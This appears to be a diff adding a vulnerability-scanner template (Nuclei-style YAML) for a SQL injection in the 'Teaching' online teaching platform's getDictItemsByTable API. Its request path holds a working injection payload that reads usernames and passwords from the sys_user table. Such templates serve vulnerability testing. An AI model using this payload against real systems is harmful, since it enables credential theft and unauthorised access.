@@ -1,0 +1,23 @@
+id: Teaching-getDictItemsByTable-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: Teaching在线教学平台getDictItemsByTable存在sql注入漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/17fce9e8a8e4c711753f586f24a2b8351f367aee#diff-15f087be5009ce781ba822659a015b2d927117e6e50bdb589a57515ea5d29236R14
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/username,password%20'/x.js"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"username"'
+
+
